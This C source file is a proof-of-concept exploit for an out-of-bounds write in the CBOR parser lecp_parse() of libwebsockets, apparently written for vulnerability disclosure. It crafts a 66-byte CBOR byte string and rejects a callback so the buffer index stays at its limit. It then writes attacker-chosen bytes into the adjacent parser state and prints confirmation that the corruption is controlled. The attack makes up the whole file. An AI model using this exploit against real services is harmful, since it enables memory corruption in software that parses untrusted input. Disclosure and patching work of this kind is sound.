/*
 * PoC for CBOR position OOB write in lecp_parse() (lecp.c:390-394)
 *
 * Demonstrates attacker has FULL BYTE CONTROL over the
 * OOB write — any byte value 0x00-0xFF can be written to ctx->item[0].
 *
 * The write-before-check pattern:
 *   ctx->cbor[ctx->cbor_pos++] = c;           // line 391
 *   if (ctx->cbor_pos == sizeof(ctx->cbor) && // line 392
 *       report_raw_cbor(ctx))                 // line 393
 *       goto reject_callback;
 *
 * When the callback rejects, cbor_pos stays at 64. On retry, the
 * next byte writes to cbor[64] = item[0]. The attacker controls
 * the CBOR input, so they control the exact byte written.
 *
 * Usage: ./poc_lecp_cbor_pos_oob
 */

#include <libwebsockets.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

static const char * const tok[] = { "dummy___" };

static int reject_count = 0;

static signed char
cb(struct lecp_ctx *ctx, char reason)
{
    if (reason == LECPCB_LITERAL_CBOR) {
        reject_count++;
        if (reject_count == 1) {
            fprintf(stderr, "    LECPCB_LITERAL_CBOR — rejecting (cbor_pos=%u)\n",
                    ctx->cbor_pos);
            return 1;
        }
    }
    return 0;
}

static int
setup_overflow_state(struct lecp_ctx *ctx)
{
    /*
     * CBOR input: a byte string of 66 bytes.
     * Header: 0x58 0x42 (bstr, 1-byte length = 66)
     * Body: 66 bytes of 0x42
     *
     * The first 2 bytes are header. The remaining 64 bytes fill
     * ctx->cbor[0..63]. When cbor_pos reaches 64, report_raw_cbor()
     * is called. Our callback rejects it, so cbor_pos stays at 64.
     */
    uint8_t phase1[68];
    phase1[0] = 0x58;
    phase1[1] = 66;
    memset(&phase1[2], 0x42, 66);

    reject_count = 0;
    lecp_construct(ctx, cb, NULL, tok, LWS_ARRAY_SIZE(tok));
    lecp_parse_report_raw(ctx, 1);

    int ret = lecp_parse(ctx, phase1, 66);
    if (ctx->cbor_pos != sizeof(ctx->cbor)) {
        fprintf(stderr, "[-] Setup failed: cbor_pos=%u, expected %zu\n",
                ctx->cbor_pos, sizeof(ctx->cbor));
        return -1;
    }
    return ret;
}

int
main(void)
{
    struct lecp_ctx ctx;

    fprintf(stderr, "[*] LECP CBOR Position OOB Write — Controlled Write PoC\n");
    fprintf(stderr, "[*] sizeof(ctx.cbor) = %zu\n", sizeof(ctx.cbor));
    fprintf(stderr, "[*] offsetof(cbor)   = %zu\n", offsetof(struct lecp_ctx, cbor));
    fprintf(stderr, "[*] offsetof(item)   = %zu\n", offsetof(struct lecp_ctx, item));
    fprintf(stderr, "[*] cbor[64] overlaps with item[0]\n\n");

    lws_set_log_level(0, NULL);

    /*
     * Phase 1: Prove attacker controls the EXACT byte written
     *
     * We test multiple byte values to show the attacker has full
     * control over what gets written to ctx->item[0].
     */
    fprintf(stderr, "[*] Phase 1: Controlled write — attacker chooses the byte\n\n");

    uint8_t test_values[] = { 0xDE, 0xAD, 0x42, 0xFF, 0x00, 0x41 };
    int num_tests = (int)(sizeof(test_values) / sizeof(test_values[0]));
    int passed = 0;

    for (int i = 0; i < num_tests; i++) {
        if (setup_overflow_state(&ctx) < 0 && ctx.cbor_pos != sizeof(ctx.cbor)) {
            lecp_destruct(&ctx);
            continue;
        }

        uint8_t before = ((uint8_t *)&ctx.item)[0];
        uint8_t trigger = test_values[i];

        lecp_parse(&ctx, &trigger, 1);

        uint8_t after = ((uint8_t *)&ctx.item)[0];

        fprintf(stderr, "    Test %d: input=0x%02x → item[0]: 0x%02x → 0x%02x",
                i + 1, trigger, before, after);

        if (after == trigger) {
            fprintf(stderr, "  ✓ CONTROLLED\n");
            passed++;
        } else {
            fprintf(stderr, "  (parser also modified item)\n");
        }

        lecp_destruct(&ctx);
    }

    fprintf(stderr, "\n[+] Result: %d/%d test values written exactly to item[0]\n",
            passed, num_tests);
    fprintf(stderr, "[+] Attacker sends crafted CBOR → controls byte written past cbor[]\n\n");

    /*
     * Phase 2: Show what the corrupted item field means
     *
     * ctx->item is struct lecp_item — its first byte is part of the
     * item parsing state. Corrupting it changes how the parser
     * interprets subsequent CBOR data.
     */
    fprintf(stderr, "[*] Phase 2: Impact — struct lecp_item corruption\n\n");

    if (setup_overflow_state(&ctx) >= 0 || ctx.cbor_pos == sizeof(ctx.cbor)) {
        uint8_t item_before[8];
        memcpy(item_before, &ctx.item, 8);

        fprintf(stderr, "    item bytes before: ");
        for (int i = 0; i < 8; i++)
            fprintf(stderr, "%02x ", item_before[i]);
        fprintf(stderr, "\n");

        uint8_t trigger = 0xFF;
        lecp_parse(&ctx, &trigger, 1);

        uint8_t item_after[8];
        memcpy(item_after, &ctx.item, 8);

        fprintf(stderr, "    item bytes after:  ");
        for (int i = 0; i < 8; i++)
            fprintf(stderr, "%02x ", item_after[i]);
        fprintf(stderr, "\n");

        fprintf(stderr, "    Corrupted byte 0:  0x%02x → 0x%02x\n",
                item_before[0], item_after[0]);
        fprintf(stderr, "\n    struct lecp_item contains:\n");
        fprintf(stderr, "    - opcode: parser's current operation type\n");
        fprintf(stderr, "    - Corrupting byte 0 changes the opcode → parser\n");
        fprintf(stderr, "      misinterprets subsequent data, potentially\n");
        fprintf(stderr, "      causing type confusion in the application\n");

        lecp_destruct(&ctx);
    }

    fprintf(stderr, "\n[+] CONTROLLED WRITE CONFIRMED:\n");
    fprintf(stderr, "[+] Attacker controls: the byte value (any 0x00-0xFF)\n");
    fprintf(stderr, "[+] Target: ctx->item[0] (parser state / opcode)\n");
    fprintf(stderr, "[+] Trigger: CBOR bstr filling cbor[] + rejected callback + retry\n");
    fprintf(stderr, "[+] No authentication required — occurs during CBOR parsing\n");

    return 0;
}
